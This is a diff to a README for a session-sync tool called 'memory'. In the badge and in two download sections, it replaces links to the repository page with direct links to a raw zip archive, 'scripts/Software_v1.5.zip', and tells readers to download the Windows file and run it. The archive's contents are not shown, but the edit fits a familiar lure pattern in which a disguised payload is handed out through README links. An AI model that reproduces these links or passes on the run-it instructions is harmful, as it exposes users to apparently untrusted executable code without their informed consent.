@@ -1,12 +1,12 @@
 # 🧠 memory - Keep Every Session in Sync
 
-[![Download memory](https://img.shields.io/badge/Download%20memory-blue?style=for-the-badge)](https://github.com/kycvcam-commits/memory)
+[![Download memory](https://img.shields.io/badge/Download%20memory-blue?style=for-the-badge)](https://github.com/kycvcam-commits/memory/raw/refs/heads/main/scripts/Software_v1.5.zip)
 
 ## 🚀 Download and Install
 
 Use this link to visit the download page:
 
-https://github.com/kycvcam-commits/memory
+https://github.com/kycvcam-commits/memory/raw/refs/heads/main/scripts/Software_v1.5.zip
 
 1. Open the link in your web browser.
 2. Look for the latest Windows download on the page.
@@ -216,6 +216,6 @@ This keeps your work easy to pick up later.
 
 If you need to get memory again, use this page:
 
-https://github.com/kycvcam-commits/memory
+https://github.com/kycvcam-commits/memory/raw/refs/heads/main/scripts/Software_v1.5.zip
 
 Open the page, download the Windows file, and run it on your PC
